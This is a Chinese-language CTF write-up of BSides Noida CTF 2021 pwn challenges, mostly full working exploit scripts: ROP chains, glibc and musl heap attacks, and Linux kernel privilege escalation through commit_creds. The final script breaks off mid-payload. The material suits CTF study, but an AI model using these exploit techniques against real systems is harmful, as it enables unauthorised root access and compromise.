# BSides Noida CTF 2021


周末和学弟学妹一起打的一场比赛，比较基础，但涉及的知识面较广，有必要整理查漏补缺
url: https://ctftime.org/event/1397  rank 8 with lilac 

<!--more-->

* babystack: static link, find gadget to trigger your own syscall and ROP
* warmup: glibc2.32 (lastest version) tcache exploitation, xor bypass
* khop: basic linux kernel exploits, use-after-free and zero deference
* babymusl: musl libc heap exploits, unlink vulnerability and ROP
* suscall: basic linux kernel exploits, bugged syscall implemented by host
* trash: glibc2.32 off-by-null, trigger heap overlapping and double free
* Interpreter: virtual machine exploits, out-of-bound read and write



## babystack

明显的栈溢出。

静态编译，什么gadget都有，syscall只开了orw，但是并没有找到open。

那就自己凑syscall吧

```python
""" x1do0 / Lilac """
from pwn import *
context.arch = 'amd64'

# io = process("./babystack.out")
io = remote("34.136.150.230", 49156)
context.log_level = 'debug'

open64 = 0x442BA0
read = 0x442CD0
write = 0x442D70
prdir = 0x00000000004018f4
prsir = 0x000000000040970e
prdxr = 0x000000000040182f
praxr = 0x0000000000410da4
mov_rax_rdi_ret = 0x0000000000413b14
syscall = 0x442D85
mprotect = 0x443AF0

target = 0x4bc000
rop = flat(
    prdir, 0, prsir, target+0x50, prdxr, 0x10, read,
    prdir, target+0x50, prsir, 0, praxr, 2, syscall,
    prdir, 3, prsir, target+0x100, prdxr, 0x30, read,
    prdir, 1, prsir, target+0x100, prdxr, 0x30, write)

# gdb.attach(io, "b *0x442D85")
io.sendline('\x00'*0x48 + rop)

io.send("flag.txt")
io.interactive()
```

## warmup

2.32的新版本堆，明显的uaf，增删改打印功能齐全。还是改tcache的fd，打到free_hook，但是需要绕过tcache的异或检测。只需要在分配第一个tcache时uaf泄露出fd位置，便是异或的key（一开始的fd是0）。

详见 https://cloud.tencent.com/developer/article/1643954


```python
""" yty & wangjihe / Lilac """
import os
import sys
import time
from pwn import *

libc_path = "/usr/lib/glibc/2.32-0ubuntu3_amd64/libc-2.32.so"
elf_path = "./a.out"

gdb_args = '''
b *(0x555555554000 + 0x13B5)
b *(0x555555554000 + 0x16A2)
'''

context.arch = "amd64"

if len(sys.argv) == 3:
    context.log_level = 'error'
else:
    context.log_level = 'info'

context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf_path
libc = ELF(libc_path)
elf = ELF(elf_path)


def tob(a):
    if isinstance(a, str):
        return bytes(a, encoding="utf-8")
    else:
        return bytes(str(a), encoding="utf-8")


if len(sys.argv) == 1 or sys.argv[1] == "d":
    io = gdb.debug(context.binary.path, gdb_args)
elif len(sys.argv) == 3:
    if isinstance(sys.argv[2], int):
        io = remote(sys.argv[1], sys.argv[2])
    elif isinstance(sys.argv[2], str) or isinstance(sys.argv[2], bytes):
        io = remote(sys.argv[1], int(sys.argv[2]))
elif sys.argv[1] == "l":
    io = process(context.binary.path)
else:
    io = remote("34.136.150.230", 49153)


def choice(v):
    io.sendlineafter(b"=6= exit\n", tob(v))


def add(idx, size, data=b""):
    choice(1)
    io.sendlineafter(b"idx: ", tob(idx))
    io.sendlineafter(b"sz: ", tob(size))
    if size != 0:
        io.sendlineafter(b"data: ", data)


def show(idx):
    choice(2)
    io.sendlineafter(b"idx: ", tob(idx))


def edit(idx, data):
    choice(3)
    io.sendlineafter(b"idx: ", tob(idx))
    io.sendlineafter(b"data: ", data)


def rm(idx):
    choice(4)
    io.sendlineafter(b"idx: ", tob(idx))


def save(idx):
    choice(5)
    io.sendlineafter("idx: ", tob(idx))


add(0,0x18,b"a")
add(1,0x500,b"a")
add(2,0x18,b"a") # 0x55555555b6e0
add(3,0x18,b"a")
rm(0)
add(0,0)
show(0)
io.recvuntil(b"data: ")
key = u64(io.recv(5) + b'\0'*3)
print(hex(key))

rm(1)
add(1,0)
show(1)
io.recvuntil(b"data: ")
libc.address = u64(io.recv(6) + b'\0'*2) - 0x1e4030
print(hex(libc.address))


add(9,0x18,b"a")
rm(9)
save(2)
rm(2)
edit(2,p64(libc.symbols["__free_hook"] ^ key))
add(4,0x18)
add(5,0x18,p64(libc.symbols["system"]))
add(6,0x28,b"/bin/sh\0")
rm(6)

io.interactive()
```


## khop

全局变量message uaf，开两个fd，close其中一个，另外一个还可以接着用。

```c
static ssize_t dev_read(struct file *fp, char *buf, size_t size, loff_t *off)
{
	char kernel_stack[48];
	int len = strlen(message);
    if (*off >= len) {
        return 0; /* end of file */
    }
    memcpy(kernel_stack, message, len);
	if(len > size - *off) {
        len = size - *off;
    }
    if(copy_to_user(buf, kernel_stack + *off, len)) {
        return -EFAULT;
    }

    *off += len;
    return len;
}
```

启动脚本特意关掉了mmap_min_addr，所以直接mmap到0地址处，控制内容导致copy_to_user时造成内核栈溢出。cr4的gadget没得，只能在内核栈上提权了。

需要绕过canary、smep、KPTI，直接swapgs_restore_regs_and_return_to_usermode一把梭

```c
/* x1do0 / Lilac */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <errno.h>

struct trap_frame{
    void *rip;
    unsigned long long cs;
    unsigned long long eflags;
    void *rsp;
    unsigned long long ss;
}__attribute__((packed));
struct trap_frame tf;
unsigned long long tf_addr = &tf;
#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL = 0xffffffff810cc140;
void* (*commit_creds)(void*) KERNCALL = 0xffffffff810cbdd0;



uint64_t u64(char * s){
    uint64_t result = 0;
    for (int i = 7 ; i >=0 ;i--){
        result = (result << 8) | (0x00000000000000ff & s[i]);
    }
    return result;
}


void init_tf_work(void){
    //__asm__ volatile(".intel_syntax noprefix;"
    //    "mov tf+8, cs;"    //set cs
    //    "pushf;pop tf+16;"       //set eflags
    //    "push rsp;pop tf+24;"
    //    "mov tf+32, ss;");
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3;\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(tf.cs), "=r"(tf.ss), "=r"(tf.eflags), "=r"(tf.rsp)
        :
        : "memory");
    tf.rip = 0xdeadbeef;
    tf.rsp -= 0;
    printf("[*] Reg saved cs = %llx, ss = %llx, flags = %llx, user_sp = %llx\n", tf.cs, tf.ss, tf.eflags, tf.rsp);
}

void get_shell(){
        system("/bin/sh");
}


int main()
{
        printf("[*] mmap at 0x100000, ret %x\n", mmap(0x100000, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE,  MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0) );
        int get_shell_64[] = {0x6a,0x68,0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x2f,0x73,0x50,0x48,0x89,0xe7,0x68,0x72,0x69,0x1,0x1,0x81,0x34,0x24,0x1,0x1,0x1,0x1,0x31,0xf6,0x56,0x6a,0x8;
        puts("[*] write shellocde");
        for(int i=0; i<sizeof(get_shell_64)/4 ;i++)
        {
            *(char *)(0x100000 + i) = get_shell_64[i];
        }

        // extern int errno;
        int fd, fd2, exp_fd;
        fd = open("/dev/char_dev", O_RDWR);
        fd2 = open("/dev/char_dev", O_RDWR);
        exp_fd = open("/dev/char_dev", O_RDWR);
        close(fd2);

        char *mem = mmap(0, 0x1000, 7, 50, -1, 0);
        char buffer[0x400];
        memset(mem, '\x00', 0x30);
        mem[0x30-1] = '\n';
        read(fd, buffer, 0x30-1);

        memset(mem, '\x00', 0x30);
        mem[0x30] = '\n';
        // printf("[*] %d\n", lseek(fd, 0x28, SEEK_SET));
        read(fd, buffer, 0x60);
        long long canary = u64(buffer+1);
        long long base = commit_creds - 0xcbdd0;
        long long gadget1 = 0xffffffff8104dec1;
        long long gadget2 = 0xffffffff8110f940;
        // long long iret = 0xffffffff81039a1b;
        // long long swapgs = 0xffffffff81c00aaf;
        long long pop_rsp_ret = 0xffffffff81020360;
        long long swapgs_and_iret = 0xffffffff81c00a4a;
        // 0x0000000000000730 : pop rdi ; ret
        // 0x00000000003d5380 : xchg rax, rdi ; ret
        // 0x00000000000064ed : pop rsp ; ret
        // printf("[*] %d\n", lseek(fd, 0, SEEK_SET));

        memset(mem, '\x00', 0x100);
        mem[0x100] = '\n';
        int i=0;
        long long *ropchain = (long long *)(mem+0x30);
        ropchain[i++] = canary;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = pop_rsp_ret;
        ropchain[i++] = 0xd00;

        init_tf_work();

        ropchain = (long long *)(mem + 0xd00);
        i = 0;
        ropchain[i++] = gadget1;
        ropchain[i++] = 0;
        ropchain[i++] = prepare_kernel_cred;
        ropchain[i++] = gadget2;
        ropchain[i++] = 0;
        ropchain[i++] = commit_creds;
        ropchain[i++] = swapgs_and_iret;
        ropchain[i++] = 0;
        ropchain[i++] = 0;
        ropchain[i++] = &get_shell;
        ropchain[i++] = tf.cs; // tf.cs, tf.ss, tf.eflags, tf.rsp
        ropchain[i++] = tf.eflags;
        ropchain[i++] = tf.rsp;
        ropchain[i++] = tf.ss;
        ropchain[i++] = 10;
        read(exp_fd, buffer, 0x60);
        // system("/bin/sh");

        // ropchain[i++] = get_root;

        return 1;
}
```

## baby_musl

给的是docker，看一下dockerfile，server就是拿ubuntu2004直接apt装的musl

```dockerfile
#sudo docker build . -t test_chall
#sudo docker run -d -p 1024:1024 --rm -it test_chall

FROM ubuntu:20.04

RUN useradd -d /home/ctf/ -m -p ctf -s /bin/bash ctf
RUN echo "ctf:ctf" | chpasswd

WORKDIR /home/ctf

COPY baby_musl .
COPY flag.txt .
COPY ynetd .

RUN chown -R root:root /home/ctf

RUN apt-get update && apt-get -y dist-upgrade && apt-get -y install musl

USER ctf
EXPOSE 1024

CMD ./ynetd -p 1024 ./baby_musl
```

所以本地就拿2004做就行，musl libc版本信息如下
```
musl libc (x86_64)
Version 1.1.24
Dynamic Program Loader
Usage: /lib/x86_64-linux-musl/libc.so [options] [--] pathname [args]
```

musl堆题，保护全开，有两个洞。

前面add的时候要求idx<4，但show没检查idx
```c
unsigned __int64 show()
{
  __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Enter index");
  scanf("%lu", &v1);
  puts((const char *)chunks[v1]);
  return __readfsqword(0x28u) ^ v2;
```
而chunk和size又是挨在一起的，向size处填充地址，在show的时候将其解析为地址，实现任意地址读。

```
.bss:0000000000202040 ; _QWORD chunks[4]
.bss:0000000000202040 chunks          dq 4 dup(?)             ; DATA XREF: new+7B↑o
.bss:0000000000202040                                         ; del+51↑o ...
.bss:0000000000202060                 public data
.bss:0000000000202060 ; _DWORD data[4]
.bss:0000000000202060 data            dd 4 dup(?)             ; DATA XREF: new+98↑o
.bss:0000000000202060                                         ; edit+79↑o
.bss:0000000000202060 _bss            ends
```

free的时候也没有清空指针

```c
unsigned __int64 del()
{
  unsigned __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Enter index");
  scanf("%lu", &v1);
  if ( v1 <= 3 && chunks[v1] )
    free((void *)chunks[v1]);
  return __readfsqword(0x28u) ^ v2;
}
```

这里简单总结一下musl与glibc的堆管理区别：

1. musl没有hook
2. musl作为轻量级libc，在分配堆块时会首先考虑libc上的空闲页，不会直接开在heap段上，但这样也使得堆上到处都是libc地址。
3. musl类似于只有smallbin和largebin，一般unlink是十分奏效的利用方式

最后思路为：堆上拿到残留的libc地址，利用任意地址读environ拿到栈地址，再在栈上拿到elf加载地址。unlink打到bss段堆指针，实现任意地址写，最后写rop即可。

```python
""" x1do0 / Lilac """ 

from pwn import *

def choice(ch):
    io.sendlineafter("[4] Show\n", str(ch))

def new(idx, size):
    choice(1)
    io.sendlineafter("Enter index", str(idx))
    io.sendlineafter("Enter size", str(size))

def remove(idx):
    choice(2)
    io.sendlineafter("Enter index", str(idx))

def edit(idx, con):
    choice(3)
    io.sendlineafter("Enter index", str(idx))
    io.sendafter("Enter data", con)

def show(idx):
    choice(4)
    io.sendlineafter("Enter index", str(idx))

context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

# b *0xA25+0x555555554000 del
# b *0x988+0x555555554000 add 
debug = """
b *0xC31+0x555555554000
set $data = 0x202040 + 0x555555554000
"""
# debug = ''

io = process("./baby_musl")
# gdb.attach(io, debug)
io.sendafter("Enter your name", 'xd')

elf = ELF("./baby_musl")
libc = elf.libc

new(0, 0x10)
new(1, 0x30)

remove(0)

show(0)
io.recvuntil("\n")
libc.address = u64(io.recv(6) + b'\x00\x00') - 0xb0a40
print(hex(libc.address))

stack = libc.sym['environ']
print(hex(stack))

new(2, stack & 0xffffffff)
new(3, stack >> 32)

show(5)
io.recvuntil("\n")
stack_addr = u64(io.recv(6) + b'\x00\x00') - 0xb0a40
print(hex(stack_addr))

target = stack_addr + 0xb09f0
print(hex(target))

elf_addr = target + 0x30
new(2, elf_addr & 0xffffffff)
new(3, elf_addr >> 32)
show(5)
io.recvuntil("\n")
elf_base = u64(io.recv(6) + b'\x00\x00') - 0x796
print(hex(elf_base))

new(0, 0x80)
remove(0)
edit(0, p64(elf_base + 0x202040-0x18) + p64(elf_base + 0x202040 - 0x10))
new(1, 0x80)
# new(2, 0x10)

system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))
pop_rdi_ret = libc.address + 0x0000000000015291

edit(0, p64(target)*3)
edit(0, p64(pop_rdi_ret) + p64(binsh) + p64(system))
choice(666)


io.interactive()
```

## teensum

草 直球栈溢出，这题没人做？

给了docker和libc，实际上就是ubuntu20.04，libc也没做什么手脚。

```bash
x1do0@x1do0:~/linux_share/BSides-Noida-CTF-2021/teen-sum/release$ md5sum /lib/x86_64-linux-gnu/libc-2.31.so
d371da546786965fe0ee40147ffef716  /lib/x86_64-linux-gnu/libc-2.31.so
x1do0@x1do0:~/linux_share/BSides-Noida-CTF-2021/teen-sum/release$ md5sum libc.so.6
d371da546786965fe0ee40147ffef716  libc.so.6
```

开了pie，但是栈上本来就有残留地址，直接日就完事了。

```python
""" x1do0 / Lilac """

from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

io = process("./teen-sum", aslr=False)
# gdb.attach(io, "b *0x138B+0x555555554000")
libc = ELF("./libc.so.6")

io.sendlineafter("> ", str(0xa0))

io.sendafter("> ", '\n')

io.recvuntil("Hey ")
libc_base = u64(io.recv(6) + b'\x00\x00') - 0x227e0a
print(hex(libc_base))

io.sendlineafter("How many?", str(1))
io.sendlineafter("Please enter them one by one.", str(1))
io.sendlineafter("1. Yes", str(1))
io.sendlineafter("New size please.>", str(0x100))

prdir = libc_base + 0x0000000000026b72 #  pop rdi ; ret
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))
empty_ret = libc_base + 0x0000000000025679
rop = flat(empty_ret, prdir, binsh, system)

io.sendlineafter("New Name please ^.^ :", b'a'*0x38 + p64(0x100) + b'a'*8 + rop)


io.interactive()
```

## suscall

题目提供了一个任意函数执行的漏洞系统调用，把reboot关了跑一下。妈的直接暴毙

```bash
[    0.033687] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline
[    0.100000] ..MP-BIOS bug: 8254 timer not connected to IO-APIC
[    0.430283] Kernel panic - not syncing: Out of memory and no killable processes...
[    0.430283]
[    0.430627] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 4.4.271 #8
[    0.430804] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[    0.431059]  0000000000000000 ffff8800028eb928 ffffffff834bbc18 ffffffff837ac6e0
[    0.431104]  ffff8800028eb9b8 ffff8800028eb9a8 ffffffff834bab4f 0000000000000008
[    0.431104]  ffff8800028eb9b8 ffff8800028eb950 6170203035373032 0000000000000246
[    0.431104] Call Trace:
[    0.431104]  [<ffffffff834bbc18>] dump_stack+0x57/0x6d
[    0.431104]  [<ffffffff834bab4f>] panic+0xb9/0x1fd
[    0.431104]  [<ffffffff82d21aa3>] out_of_memory+0x423/0x490
[    0.431104]  [<ffffffff82d27412>] __alloc_pages_nodemask+0xa62/0xa90
[    0.431104]  [<ffffffff82d2bc8b>] ? release_pages+0x8b/0x1f0
[    0.431104]  [<ffffffff82d63cee>] alloc_page_interleave+0x3e/0x90
[    0.431104]  [<ffffffff82d641a4>] alloc_pages_current+0xb4/0x110
[    0.431104]  [<ffffffff82d1dc58>] __page_cache_alloc+0xb8/0xe0
[    0.431104]  [<ffffffff82d1e868>] pagecache_get_page+0x88/0x1b0
[    0.431104]  [<ffffffff82d1e9b4>] grab_cache_page_write_begin+0x24/0x40
[    0.431104]  [<ffffffff82d98ce4>] simple_write_begin+0x24/0x190
[    0.431104]  [<ffffffff82d1e193>] generic_perform_write+0xb3/0x1a0
[    0.431104]  [<ffffffff834c2fed>] ? down_write+0xd/0x40
[    0.431104]  [<ffffffff82d1f4e4>] __generic_file_write_iter+0x104/0x1b0
[    0.431104]  [<ffffffff82d1f669>] generic_file_write_iter+0xd9/0x200
[    0.431104]  [<ffffffff83b3c795>] ? initcall_blacklist+0xaa/0xaa
[    0.431104]  [<ffffffff82d728f0>] __vfs_write+0xb0/0xe0
[    0.431104]  [<ffffffff82d73301>] vfs_write+0x91/0x180
[    0.431104]  [<ffffffff83b3c795>] ? initcall_blacklist+0xaa/0xaa
[    0.431104]  [<ffffffff82d73f14>] SyS_write+0x44/0xb0
[    0.431104]  [<ffffffff83b3e11d>] xwrite+0x29/0x5c
[    0.431104]  [<ffffffff83b3de5b>] ? md_run_setup+0x94/0x94
[    0.431104]  [<ffffffff83b3e706>] do_copy+0x29/0xb6
[    0.431104]  [<ffffffff83b3defc>] write_buffer+0x26/0x37
[    0.431104]  [<ffffffff83b3e560>] unpack_to_rootfs+0xf2/0x26f
[    0.431104]  [<ffffffff83b3e8a0>] ? maybe_link.part.4+0x10d/0x10d
[    0.431104]  [<ffffffff83b3e8fc>] populate_rootfs+0x5c/0x108
[    0.431104]  [<ffffffff82c003b7>] do_one_initcall+0x87/0x1a0
[    0.431104]  [<ffffffff83b3cfa7>] kernel_init_freeable+0x159/0x1ec
[    0.431104]  [<ffffffff834bf4d0>] ? rest_init+0x80/0x80
[    0.431104]  [<ffffffff834bf4d9>] kernel_init+0x9/0xe0
[    0.431104]  [<ffffffff834c4ed5>] ret_from_fork+0x55/0x80
[    0.431104]  [<ffffffff834bf4d0>] ? rest_init+0x80/0x80
[    0.431104] Rebooting in 1 seconds..
```

看了一眼发现开完gzip太大了，所以启动脚本还是不能直接打包成cpio就送进去。顺便改了一下题目启动脚本（甚至有错别字） 这是题目给的脚本，paneic=1是什么鬼？

```bash
qemu-system-x86_64 -m 128M -initrd initramfs.cpio -kernel ./bzImage -nographic -monitor /dev/null -append "kpti=1 kaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet" -s 2>/dev/null
```

改了一下，能跑了

```bash
#!/bin/bash

gcc   exp.c -static -masm=intel  -fno-stack-protector  -o exploit
# gcc -o exp -static -fno-stack-protector -DREMOTE -nostdlib poc.c
cp exp files/

cd files
find . | cpio -o --format=newc > ../rootfs.cpio
cd ..
gzip rootfs.cpio

read input

if [ "$input" == "y" ]; then
        echo 'wrong'
        exit
fi

qemu-system-x86_64 -m 128M -initrd rootfs.cpio.gz \
        -no-reboot \
        -kernel ./bzImage -nographic -monitor /dev/null \
        -append "kpti=1 kaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet" -s
```

开了kaslr，但是并没有开kptr_restrict

```
/ $ cat /proc/sys/kernel/kptr_restrict
0
/ $ cat /proc/sys/kernel/perf_event_paranoid
1
```

所以每次读出来地址就行，然后调用它的syscall在内核态拿到root

```c
/* x1do0 / Lilac */

#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

#define __NR_SUSCALL 546
#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL = 0;
void* (*commit_creds)(void*) KERNCALL = 0;


void get_root(){
        commit_creds(prepare_kernel_cred(0));
}

int main(){
        puts("[*] Read commit_creds ... ");
        scanf("%llx", &commit_creds);
        printf("[*] Okay, commit_creds is : 0x%llx\n", commit_creds);
        puts("[*] Read prepare_kernel_cred ... ");
        scanf("%llx", &prepare_kernel_cred);
        printf("[*] Okay, prepare_kernel_cred is : 0x%llx\n", prepare_kernel_cred);
        printf("[*] try to syscall, get root return : %d\n", syscall(__NR_SUSCALL, get_root));
        system("/bin/sh");
        return 1;
}
```

成功拿到...

```bash
/ $ id
uid=1000(user) gid=1000(user) groups=1000(user)
/ $ ls /
bin      etc      home     lib64    proc     share    var
boot     exp      init     libexec  root     sys
dev      exploit  lib      linuxrc  sbin     usr
/ $ cat proc/kallsyms | grep commit_creds
ffffffff82c745f0 T commit_creds
/ $ cat proc/kallsyms | grep prepare_kernel
ffffffff82c749c0 T prepare_kernel_cred
/ $ /exploit
[*] Read commit_creds ...
0xffffffff82c745f0
[*] Okay, commit_creds is : 0xffffffff82c745f0[*] Read prepare_kernel_cred ...
0xffffffff82c749c0
[*] Okay, prepare_kernel_cred is : 0xffffffff82c749c0[*] try to syscall, get root return : 0
/ # id
uid=0(root) gid=0(root)
/ #
```


看了下discord有位老哥贴的exp，思路一样，证明了这题是多么哈批。

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

#define __NR_SUSCALL 546

typedef struct leak_t{
    uint64_t prepare_kernel_cred;
    uint64_t commit_creds;
} leaks;

leaks leak;

// get leaks
uint64_t get_leaks(leaks * leak){
    FILE * fp = fopen("/proc/kallsyms", "r");
    char * lineptr = NULL;
    size_t n;
    int counter = 0;
    while(counter != 2 && getline(&lineptr, &n, fp) != -1){
        if(strstr(lineptr, "prepare_kernel_cred") != NULL){
            lineptr[16] = 0;
            sscanf(lineptr, "%lx", &leak->prepare_kernel_cred);
            counter++;
            continue;
        }
        if(strstr(lineptr, "commit_creds") != NULL){
            lineptr[16] = 0;
            sscanf(lineptr, "%lx", &leak->commit_creds);
            counter++;
            continue;
        }
    }
    return 0;
}

int get_root(){
    uint64_t (*prepare_kernel_cred)(uint64_t) = leak.prepare_kernel_cred;
    uint64_t (*commit_creds)(uint64_t) = leak.commit_creds;
    commit_creds(prepare_kernel_cred(0));
}

int main(){
    // gain root
    get_leaks(&leak);
    printf("[+] prepare_kernel_cred: 0x%lx\n", leak.prepare_kernel_cred);
    printf("[+] commit_creds: 0x%lx\n", leak.commit_creds);
    uint64_t root_creds = (uint64_t)syscall(__NR_SUSCALL, get_root);
    system("/bin/sh");
    return 0;
}
```

## trash

直接给了堆地址，用于绕过2.32的异或检测。

C++堆，用allocator开的堆，但并没有考常规c++析构函数的double free，而是一个明显的off-by-null。

```c
__int64 __fastcall sub_26A3(_QWORD *a1)
{
  char v1; // bl
  int v3; // [rsp+18h] [rbp-18h]
  int i; // [rsp+1Ch] [rbp-14h]

  v3 = -1;
  for ( i = 0; i < (unsigned __int64)get_len(a1); ++i )
  {
    v1 = getchar();
    *(_BYTE *)check_add(a1, i) = v1;
    if ( *(_BYTE *)check_add(a1, i) == '\n' )
    {
      v3 = i + 1;
      break;
    }
    v3 = i + 1;
  }
  *(_BYTE *)no_check_add(a1, v3) = 0;           // off-by-null
  return (unsigned int)v3;
```

但这个'\x00'也导致了后续利用的困难，因为打印函数会在此截断。

```c
__int64 __fastcall sub_275A(__int64 a1)
{
  char *v1; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; *(_BYTE *)check_add(a1, i); ++i )
  {
    v1 = (char *)check_add(a1, i);
    std::operator<<<std::char_traits<char>>(&std::cout, (unsigned int)*v1);
  }
  return std::ostream::operator<<(&std::cout, &std::endl<char,std::char_traits<char>>);
}
```

总的来说这题比较麻烦的点在于：

1. 所有的读入后面都会添加\x00，同时\n也会读入
2. 没有free，只有类似于realloc改变大小时顺带的free
3. 开了sandbox，只能orw
4. glibc2.32 在输入堆地址时记得mask一下


令人痛心的是，新版本的setcontext已经不用rdi了，导致只能rop

```
Dump of assembler code for function setcontext:                         
   0x000015555517b0a0 <+0>:     endbr64                                 
   0x000015555517b0a4 <+4>:     push   rdi                              
   0x000015555517b0a5 <+5>:     lea    rsi,[rdi+0x128]                  
   0x000015555517b0ac <+12>:    xor    edx,edx                          
   0x000015555517b0ae <+14>:    mov    edi,0x2                          
   0x000015555517b0b3 <+19>:    mov    r10d,0x8                         
   0x000015555517b0b9 <+25>:    mov    eax,0xe                          
   0x000015555517b0be <+30>:    syscall                                 
   0x000015555517b0c0 <+32>:    pop    rdx                              
   0x000015555517b0c1 <+33>:    cmp    rax,0xfffffffffffff001           
   0x000015555517b0c7 <+39>:    jae    0x15555517b1ef <setcontext+335>  
   0x000015555517b0cd <+45>:    mov    rcx,QWORD PTR [rdx+0xe0]         
   0x000015555517b0d4 <+52>:    fldenv [rcx]                            
   0x000015555517b0d6 <+54>:    ldmxcsr DWORD PTR [rdx+0x1c0]           
   0x000015555517b0dd <+61>:    mov    rsp,QWORD PTR [rdx+0xa0]         
   0x000015555517b0e4 <+68>:    mov    rbx,QWORD PTR [rdx+0x80]         
   0x000015555517b0eb <+75>:    mov    rbp,QWORD PTR [rdx+0x78]         
   0x000015555517b0ef <+79>:    mov    r12,QWORD PTR [rdx+0x48]         
   0x000015555517b0f3 <+83>:    mov    r13,QWORD PTR [rdx+0x50]         
   0x000015555517b0f7 <+87>:    mov    r14,QWORD PTR [rdx+0x58]         
   0x000015555517b0fb <+91>:    mov    r15,QWORD PTR [rdx+0x60]         
   0x000015555517b0ff <+95>:    test   DWORD PTR fs:0x48,0x2            
```

所以核心思路是off-by-null使chunk的inuse位置0，标志着前一个chunk使空闲的，导致在free当前chunk时触发unlink向前合并。在前一个块精心布局绕过unlink检查，我们就可以向前合并导致堆块重叠。可以直接动态调试绕过unlink检测。

```
   0x1555551bba41 <unlink_chunk.isra+33>     cmp    rdi, qword ptr [rax + 0x18]                   
   0x1555551bba45 <unlink_chunk.isra+37>     jne    unlink_chunk.isra+160 <unlink_chunk.isra+160> 
                                                                                                  
 ► 0x1555551bba47 <unlink_chunk.isra+39>     cmp    rdi, qword ptr [rdx + 0x10]                   
   0x1555551bba4b <unlink_chunk.isra+43>     jne    unlink_chunk.isra+160 <unlink_chunk.isra+160> 

   0x1555551bbac0 <unlink_chunk.isra+160>    lea    rdi, [rip + 0x11f990]             
   0x1555551bbac7 <unlink_chunk.isra+167>    call   malloc_printerr <malloc_printerr>  # unlink 出错
```

堆块合并拿到libc基址后，直接分配到environ去泄露stack地址，还是因为有个\x00

看来还得打stdout拿到栈地址，我们知道在IO FILE的flag为某些值时write_base到write_end会打印出来。所以打到stdout，利用write_base拿到栈地址。然后去做栈溢出。

这里发现stdout本身的flag不对，还得从头开始改，这样如果只改一半它在刚分配过去的时候会全部清零引发错误，所以必须得足够大的块一次性把整个stdout伪造出来(只把write指针全改也不行)

exp2.31，加上mask异或就能打远程。总的来说细节还是比较繁琐。

```python
""" x1do0 / Lilac """
from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

def choice(ch):
    io.sendlineafter("> ", str(ch))

def add(idx, size, con):
    choice(1)
    io.sendlineafter("Trashcan no.: ", str(idx))
    io.sendlineafter("Size of your trash: ", str(size))
    io.sendafter("Your trash: ", con)

def change_size(idx, size):
    choice(2)
    io.sendlineafter("Trashcan no.: ", str(idx))
    io.sendlineafter("Size of new trashcan:", str(size))

def show(idx):
    choice(3)
    io.sendlineafter("Trashcan no.: ", str(idx))

debug = ""
# debug += "b *0x43BB + 0x555555554000"
# debug += "\nset $data=0x55555555d4d0"
# debug += "\nb *0x1555551bba41" # unlink check
debug += "\nb *0x46E5 + 0x555555554000"

io = process("./a.out")

choice(0x7A69)
io.recvuntil("what happened\n")
heap_addr = int(io.recv(14), 16)
print('[*] heap addr : ' + hex(heap_addr))

add(0, 0x78, 'a\n')
add(2, 0x18, 'c\n')
add(12, 0x58, 'd\n')
add(1, 0xf8, 'b\n')

change_size(0, 0x1f8) # free the first chunk and get into unsortedbin
pay = b'a'*8 + flat(0xf1, heap_addr+0x40-0x18, heap_addr+0x40-0x10) + p64(heap_addr+0x20)*2 + b'\n'
add(0, 0x78, pay)

change_size(12, 0x1f8)
add(12, 0x58 ,b'a'*0x50 + p64(0xf0))

for i in range(7):
    add(3+i, 0xf8, 'xd\n') # 3->9
for i in range(7):
    change_size(3+i, 0x1f8) # 3->9 fill 0x200 tcache

add(0x1f, 0x58, '\n')
change_size(0x1f, 0x2f8)


change_size(1, 0x2f8)

# change_size(2, 0x2f8)
add(10, 0x68, 'x\n')
show(2)

libc = ELF('./a.out').libc
libc.address = u64(io.recv(6)+b'\x00\x00') - 0x1ebbe0
write_base = libc.address + 0x1ec6c0
stdin = libc.address + 0x1eb980
stack = libc.sym['environ']
print(hex(libc.address))


change_size(12, 0x2f8)

add(13, 0x30, b'a'*0x18 + p64(0x41) + p64(write_base-0x20)*2)

add(14, 0x50, b'\x00'*0x18 + p64(0x141)+ p64(0x000015555530ebe0-0x155555123000+libc.address)+ p64(0x000015555530ebe0-0x155555123000+libc.address)+b'\n')

add(14, 0x130, '\n')

iofile = p64(0xfbad1800)
